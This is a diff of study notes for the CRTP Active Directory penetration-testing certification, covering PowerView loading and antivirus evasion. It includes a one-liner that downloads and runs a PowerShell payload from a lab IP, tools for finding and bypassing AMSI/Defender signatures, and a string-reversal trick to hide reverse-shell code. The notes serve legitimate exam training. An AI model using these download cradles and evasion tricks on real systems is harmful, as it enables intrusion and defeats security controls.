@@ -1,10 +1,11 @@
 # CRTP One Week Challenge
 
 # PowerShell
-- Load a script and module (local)
--     . C:\AD\Tools\PowerView.ps1  OR  Import-Module C:\AD\Tools\PowerView.ps1
--     Get-Command -Module <modulename>   (list all the commands u can use in particular module)
-
+Load a script and module (local)
+```
+. C:\AD\Tools\PowerView.ps1  OR  Import-Module C:\AD\Tools\PowerView.ps1
+Get-Command -Module <modulename>   (list all the commands u can use in particular module)
+```
 - Load a script and module (remotely)
 -     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')
 
@@ -21,8 +22,7 @@ Bypassing AV Signatures for PowerShell
 -     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
 .      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
 example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
-Reverse the "Net.Sockets" string on line number 32
-## AMSITrigger
+## Reverse the "Net.Sockets" string on line number 32
 ```powershell
 $string = "stekcoS.teN"
 $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
